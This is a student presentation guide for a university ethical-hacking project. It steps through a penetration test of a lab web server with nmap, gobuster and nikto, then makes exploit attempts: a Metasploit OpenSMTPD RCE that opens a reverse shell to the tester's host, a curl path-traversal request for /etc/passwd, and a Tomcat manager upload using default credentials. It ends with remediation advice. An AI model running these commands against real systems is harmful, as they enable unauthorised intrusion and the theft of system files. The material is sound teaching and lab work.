# ICT387 Ethical Hacking Project Presentation Guide

This guide provides a clear, step-by-step breakdown of how to deliver a professional presentation based on the ICT387 Ethical Hacking Project report and the README.md command log. Each step is mapped to specific phases of penetration testing with an explanation of tools, commands, and expected outcomes.

---

## Step 1: **Introduction & Objective**
- **Slide Content:**
  - Title: "Penetration Testing on Flower Art Web Infrastructure"
  - Objective: "To identify and exploit vulnerabilities in a black-box environment using professional tools."
- **Talking Points:**
  - Brief intro of project scope.
  - Student ID, Date of engagement.
  - Explain black-box testing methodology.

---

## Step 2: **Environment Setup**
- **Command:**
  ```bash
  date && echo "StudentID: 34658965" && echo ""
  sudo apt update && sudo apt install -y nmap nikto gobuster ftp
  ```
- **Explanation:**
  - Logs the session with a timestamp and ID.
  - Updates the package list and installs necessary tools.
  - **Outcome:** Tools ready for penetration testing.

---

## Step 3: **Nmap Full Port Scan**
- **Command:**
  ```bash
  sudo nmap -Pn -p- 192.168.56.145 -oN all-port-scan.txt
  ```
- **Explanation:**
  - Scans all 65535 TCP ports.
  - **Outcome:** Identifies open ports for deeper inspection.

---

## Step 4: **Nmap Vulnerability Script Scan**
- **Command:**
  ```bash
  nmap -T4 -Pn -p21,22,23,25,80,139,445,8888 -sV --script vuln 192.168.56.145 -oN script-vuln-sV-scan.txt
  ```
- **Explanation:**
  - Checks specific ports using vulnerability scripts.
  - **Outcome:** Detects known CVEs in running services.

---

## Step 5: **Nessus Vulnerability Scan**
- **Action:** Use Nessus GUI to scan the target.
- **Explanation:**
  - Launch Nessus and run a full system scan.
  - **Outcome:** Generates a detailed vulnerability report.

---

## Step 6: **Web Enumeration – Gobuster**
- **Command:**
  ```bash
  gobuster dir -u http://192.168.56.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
  ```
- **Explanation:**
  - Performs directory brute-forcing on the web server.
  - **Outcome:** Finds hidden paths like `/img/`.

---

## Step 7: **Nikto Web Scan**
- **Command:**
  ```bash
  nikto -h http://192.168.56.145
  ```
- **Explanation:**
  - Scans for outdated server software and missing headers.
  - **Outcome:** Reports insecure Apache configuration.

---

## Step 8: **Exploitation – OpenSMTPD RCE (CVE-2020-7247)**
- **Command:**
  ```bash
  msfconsole -q -x 'use exploit/unix/smtp/opensmtpd_mail_from_rce; set RHOSTS 192.168.56.145; set LHOST 192.168.56.142; set LPORT 4444; run'
  ```
- **Explanation:**
  - Uses Metasploit to exploit an RCE vulnerability in OpenSMTPD.
  - **Outcome:** Root shell access on the server.

---

## Step 9: **FTP Anonymous Access**
- **Command:**
  ```bash
  ftp 192.168.56.145
  # Login: anonymous
  ls
  get fix_logging.txt
  ```
- **Explanation:**
  - Accesses FTP without credentials.
  - **Outcome:** Files can be downloaded, posing a security risk.

---

## Step 10: **Apache RCE Attempt – CVE-2021-41773**
- **Command:**
  ```bash
  curl -v --path-as-is http://192.168.56.145/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
  ```
- **Explanation:**
  - Tries to access system files via path traversal.
  - **Outcome:** Failed exploit – server returns error.

---

## Step 11: **Tomcat Upload Exploit Attempt**
- **Command:**
  ```bash
  msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS 192.168.56.145; set RPORT 8888; set HttpUsername tomcat; set HttpPassword tomcat; run'
  ```
- **Explanation:**
  - Tries to upload a payload using Tomcat credentials.
  - **Outcome:** Upload failed; interface inaccessible.

---

## Step 12: **Remediation & Conclusion**
- **Slide Content:**
  - Recap vulnerabilities and mitigation:
    - Patch SMTP, Apache, Tomcat
    - Disable anonymous FTP & Telnet
    - Harden SMB config
  - **Conclusion:**
    - Demonstrated real-world attack simulations.
    - Delivered evidence-backed recommendations.

---

## Tips for Presentation
- Open each command section with its goal.
- Include screenshots or command outputs.
- Use bullet points to explain what, why, and outcome.
- Practice a mock Q&A or interactive walk-through.

---

**Student Name:** Khushi Vaid  
**Student ID:** 34658965  
**Email:** 34658965@student.murdoch.edu.au  
**Project:** ICT387 Ethical Hacking Final Report  
**System:** Kali Linux Lab
